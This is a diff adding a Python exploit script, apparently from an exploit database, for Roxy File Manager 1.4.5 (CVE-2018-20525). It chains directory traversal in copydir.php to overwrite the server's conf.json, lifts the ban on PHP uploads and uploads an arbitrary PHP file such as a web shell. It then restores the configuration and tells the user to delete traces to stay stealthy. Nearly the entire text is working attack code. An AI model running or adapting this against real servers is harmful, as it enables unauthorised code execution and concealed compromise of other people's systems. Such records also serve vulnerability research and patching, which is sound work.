@@ -1,0 +1,200 @@
+id: 37578
+date: 04/06/2022
+title: Roxy File Manager 1.4.5 PHP File Upload Restriction Bypass Exploit
+author: Adam Shebani
+cves: CVE-2018-20525
+
+# Exploit Title: Roxy File Manager 1.4.5 PHP File Upload Restriction Bypass
+# Exploit Author: Adam Shebani (NULLHE4D)
+# Software: Roxy File Manager
+# Version: 1.4.5
+# CVE: CVE-2018-20525
+# Vendor Homepage: http://www.roxyfileman.com/
+# Software Link: http://www.roxyfileman.com/download.php?f=1.4.5-php
+# Tested on: PHP 7.2 on Ubuntu 20.04 LTS and PHP 7.4 on Windows 10
+
+
+# Roxy File Manager 1.4.5 restricts uploading files with certain
+# extensions, including various PHP extensions. These forbidden
+# extensions are configured in a file called 'conf.json' at the root
+# of the file manager's code base. Sections #1 and #1.1 at
+# https://www.exploit-db.com/exploits/46085 demonstrate a directory
+# traversal vulnerability that allows exfiltrating arbitrary
+# directories by copying them to a directory accessible through the
+# file manager's web interface. The same vulnerability can be used
+# to overwrite the 'conf.json' file by copying a directory
+# containing a modified configuration file that has been uploaded.
+# The directory must have the same name as the original
+# configuration file's parent directory (usually 'fileman'). The
+# source and destination directories will be merged and files from
+# the destination directory get overwritten by the ones from the
+# source if they have the same name.
+
+
+import argparse, requests, json, re
+from urllib.parse import urlparse, quote_plus
+from random import randint
+#from os import remove
+from os.path import isfile
+
+
+def failure():
+    print("[*] it is advised to manually cleanup any files/directories created on the target by this exploit")
+    exit(1)
+
+
+argparser = argparse.ArgumentParser()
+argparser.add_argument("-u", "--url", type=str, action="store", help="The URL to the target Roxy File Manager instance (e.g. http://localhost/fileman/)", required=True)
+argparser.add_argument("-f", "--file", type=str, action="store", help="The PHP file to upload (e.g. shell.php)", required=True)
+args = argparser.parse_args()
+
+roxy_url = args.url
+php_file = args.file
+if not isfile(php_file):
+    print("[-] specified PHP file not found")
+    exit(1)
+
+user_agent = "Mozilla/5.0 (Windows NT 6.4; rv:75.0.0) Gecko/20100101 Firefox/75.0.0"
+headers = {"User-Agent": user_agent}
+form_headers = {"User-Agent": user_agent, "Content-Type": "application/x-www-form-urlencoded"}
+roxy_url += "" if roxy_url.endswith("/") else "/"
+roxy_hostname = urlparse(roxy_url).hostname
+uploads_path = urlparse(roxy_url).path + "Uploads"
+
+
+# verify Roxy File Manager instance
+res = requests.get(roxy_url, headers=headers, allow_redirects=False)
+if res.status_code == 200 and "<title>Roxy file manager</title>" in res.text:
+    print("[+] verified Roxy File Manager instance at " + roxy_url)
+else:
+    print("[-] couldn't find a Roxy File Manager instance at the specified URL")
+    exit(1)
+
+
+# get conf.json
+url = roxy_url + "conf.json"
+res = requests.get(url, headers=headers)
+if res.status_code == 200:
+    orig_conf = res.text
+    orig_conf_json = json.loads(orig_conf)
+    extensions = orig_conf_json["FORBIDDEN_UPLOADS"].split()
+    if not "php" in extensions:
+        print("[*] PHP files are already not forbidden from being uploaded")
+        exit(0)
+else:
+    print("[-] couldn't find conf.json")
+    exit(1)
+
+
+# verify directory traversal vulnerability in fileslist
+url = roxy_url + "php/fileslist.php"
+body = "d={}&type=".format(quote_plus(uploads_path+"/.."))
+res = requests.post(url, headers=form_headers, data=body)
+res_json = json.loads(res.text)
+if res.status_code == 200 and len(res_json) > 0 and "conf.json" in res.text:
+    print("[+] verified directory traversal vulnerability in fileslist")
+else:
+    print("[-] couldn't verify directory traversal vulnerability in fileslist")
+    exit(1)
+
+
+# create fileman directory structure
+url = roxy_url + "php/createdir.php"
+random_dirname = "".join([str(randint(0,9)) for i in range(10)])
+body = "d={}&n={}".format(quote_plus(uploads_path), random_dirname)
+res = requests.post(url, headers=form_headers, data=body)
+if not '"res":"ok"' in res.text:
+    print("[-] failed to create fileman directory structure")
+    exit(1)
+tmp_path = uploads_path + "/" + random_dirname
+
+body = "d={}&n={}".format(quote_plus(tmp_path), "fileman")
+res = requests.post(url, headers=form_headers, data=body)
+if not '"res":"ok"' in res.text:
+    print("[-] failed to create fileman directory structure")
+    failure()
+fileman_path = tmp_path + "/fileman"
+
+
+# upload modified conf.json
+url = roxy_url + "php/upload.php"
+modified_conf = re.sub("\sphp\s", " ", orig_conf)
+with open("conf.json", "w") as conf_file:
+    conf_file.write(modified_conf)
+body = {"action": (None, "upload"), "method": (None, "ajax"), "d": (None, fileman_path), "files[]": open("conf.json", "rb")}
+res = requests.post(url, headers=headers, files=body)
+#remove("conf.json")
+if '"res":"ok"' in res.text:
+    print("[+] created fileman directory structure with modified conf.json")
+else:
+    print("[-] failed to upload modified conf.json")
+    failure()
+
+
+# overwrite server conf.json with copydir directory traversal vulnerability
+url = roxy_url + "php/copydir.php"
+body = "d={}&n={}".format(quote_plus(fileman_path), quote_plus(uploads_path+"/../.."))
+res = requests.post(url, headers=form_headers, data=body)
+if '"res":"ok"' in res.text:
+    print("[+] overwritten server conf.json using copydir directory traversal")
+else:
+    print("[-] failed to overwrite server conf.json using copydir directory traversal")
+    failure()
+
+
+# upload php file
+url = roxy_url + "php/upload.php"
+body = {"action": (None, "upload"), "method": (None, "ajax"), "d": (None, tmp_path), "files[]": open(php_file, "rb")}
+res = requests.post(url, headers=headers, files=body)
+if '"res":"ok"' in res.text:
+    print("[+] successfully uploaded PHP file")
+    print("[*] you can manually request the file at: " + "/".join(roxy_url.split("/")[:3]) + tmp_path + "/" + php_file)
+    print("[*] don't forget to delete this as well as it's containing directory using the file manager if you wanna be stealthy")
+else:
+    print("[-] failed to upload PHP file")
+    failure()
+
+
+# restore original conf.json and cleanup unwanted files/dirs
+url = roxy_url + "php/deletefile.php"
+body = "f=" + quote_plus(fileman_path+"/conf.json")
+res = requests.post(url, headers=form_headers, data=body)
+if not '"res":"ok"' in res.text:
+    print("[-] failed to cleanup")
+    failure()
+
+url = roxy_url + "php/upload.php"
+with open("conf.json", "w") as conf_file:
+    conf_file.write(orig_conf)
+body = {"action": (None, "upload"), "method": (None, "ajax"), "d": (None, fileman_path), "files[]": open("conf.json", "rb")}
+res = requests.post(url, headers=headers, files=body)
+#remove("conf.json")
+if not '"res":"ok"' in res.text:
+    print("[-] failed to cleanup")
+    failure()
+
+url = roxy_url + "php/copydir.php"
+body = "d={}&n={}".format(quote_plus(fileman_path), quote_plus(uploads_path+"/../.."))
+res = requests.post(url, headers=form_headers, data=body)
+if '"res":"ok"' in res.text:
+    print("[+] original conf.json restored")
+else:
+    print("[-] failed to cleanup")
+    failure()
+
+url = roxy_url + "php/deletefile.php"
+body = "f=" + quote_plus(fileman_path+"/conf.json")
+res = requests.post(url, headers=form_headers, data=body)
+if not '"res":"ok"' in res.text:
+    print("[-] failed to cleanup")
+    failure()
+
+url = roxy_url + "php/deletedir.php?d=" + quote_plus(fileman_path)
+res = requests.get(url, headers=headers)
+if '"res":"ok"' in res.text:
+    print("[+] cleanup finished successfully")
+else:
+    print("[-] failed to cleanup")
+    failure()
+
+#  0day.today [2023-03-26]  #
